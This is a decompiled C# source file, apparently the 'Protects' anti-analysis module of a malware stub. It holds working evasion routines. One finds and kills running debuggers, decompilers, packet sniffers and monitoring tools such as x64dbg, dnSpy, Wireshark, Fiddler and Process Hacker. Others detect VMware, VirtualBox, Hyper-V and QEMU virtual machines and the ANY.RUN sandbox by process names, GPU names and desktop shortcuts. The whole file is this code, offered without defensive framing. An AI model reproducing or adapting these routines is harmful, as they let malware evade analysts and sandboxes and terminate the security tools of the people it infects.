using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace Stub.Modules.Protects
{
	// Token: 0x02000007 RID: 7
	internal class Runtime
	{
		// Token: 0x0600000B RID: 11 RVA: 0x0000231C File Offset: 0x0000051C
		public static bool AntiProcess()
		{
			string[] array = new string[]
			{
				"dnspy",
				"Mega Dumper",
				"Dumper",
				"PE-bear",
				"de4dot",
				"TCPView",
				"Resource Hacker",
				"Pestudio",
				"HxD",
				"Scylla",
				"de4dot",
				"PE-bear",
				"Fakenet-NG",
				"ProcessExplorer",
				"SoftICE",
				"ILSpy",
				"dump",
				"proxy",
				"de4dotmodded",
				"StringDecryptor",
				"Centos",
				"SAE",
				"monitor",
				"brute",
				"checker",
				"zed",
				"sniffer",
				"http",
				"debugger",
				"james",
				"exeinfope",
				"codecracker",
				"x32dbg",
				"x64dbg",
				"ollydbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"dbx",
				"mdbg",
				"gdb",
				"windbg",
				"dbgclr",
				"kdb",
				"kgdb",
				"mdb",
				"ollydbg",
				"dumper",
				"wireshark",
				"httpdebugger",
				"http debugger",
				"fiddler",
				"decompiler",
				"unpacker",
				"deobfuscator",
				"de4dot",
				"confuser",
				" /snd",
				"x64dbg",
				"x32dbg",
				"x96dbg",
				"process hacker",
				"dotpeek",
				".net reflector",
				"ilspy",
				"file monitoring",
				"file monitor",
				"files monitor",
				"netsharemonitor",
				"fileactivitywatcher",
				"fileactivitywatch",
				"windows explorer tracker",
				"process monitor",
				"disk pluse",
				"file activity monitor",
				"fileactivitymonitor",
				"file access monitor",
				"mtail",
				"snaketail",
				"tail -n",
				"httpnetworksniffer",
				"microsoft message analyzer",
				"networkmonitor",
				"network monitor",
				"soap monitor",
				"ProcessHacker",
				"internet traffic agent",
				"socketsniff",
				"networkminer",
				"network debugger",
				"HTTPDebuggerUI",
				"mitmproxy",
				"python",
				"mitm",
				"Wireshark",
				"UninstallTool",
				"UninstallToolHelper",
				"ProcessHacker"
			};
			Process[] processes = Process.GetProcesses();
			foreach (string text in array)
			{
				foreach (Process process in processes)
				{
					bool flag = process.ProcessName.ToLower() == text.ToLower();
					if (flag)
					{
						try
						{
							process.Kill();
							process.Dispose();
						}
						catch
						{
						}
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002764 File Offset: 0x00000964
		public static bool AntiVM_Process()
		{
			string[] array = new string[]
			{
				"vmtoolsd",
				"vmwaretray",
				"vmwareuser",
				"vgauthservice",
				"vmacthlp",
				"vmsrvc",
				"vmusrvc",
				"prl_cc",
				"prl_tools",
				"xenservice",
				"qemu-ga",
				"joeboxcontrol",
				"ksdumperclient",
				"ksdumper",
				"joeboxserver",
				"vmwareservice",
				"vmwaretray",
				"VBoxService",
				"VBoxsTray",
				"rdpclip"
			};
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				foreach (string text in array)
				{
					bool flag = process.ProcessName.ToLower() == text.ToLower();
					if (flag)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002890 File Offset: 0x00000A90
		public static bool AntiVM_GPU()
		{
			List<string> source = new List<string>
			{
				"VirtualBox",
				"VBox",
				"VMware Virtual",
				"VMware",
				"Hyper-V Video"
			};
			List<string> gpus = Auxiliary.GetGPUs();
			return source.Any((string vgpu) => gpus.Any((string gpu) => gpu.IndexOf(vgpu, StringComparison.OrdinalIgnoreCase) >= 0));
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002908 File Offset: 0x00000B08
		public static bool AntiAnyRun()
		{
			string[] array = new string[]
			{
				"Acrobat Reader DC.lnk",
				"CCleaner.lnk",
				"FileZilla Client.lnk",
				"Firefox.lnk",
				"Google Chrome.lnk",
				"Skype.lnk",
				"Microsoft Edge.lnk"
			};
			foreach (string text in array)
			{
				bool flag = !File.Exists(Path.Combine(new string[]
				{
					Environment.ExpandEnvironmentVariables("%systemdrive%"),
					"Users",
					"Public",
					"Desktop",
					text
				}));
				if (flag)
				{
					return false;
				}
			}
			return Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC");
		}
	}
}
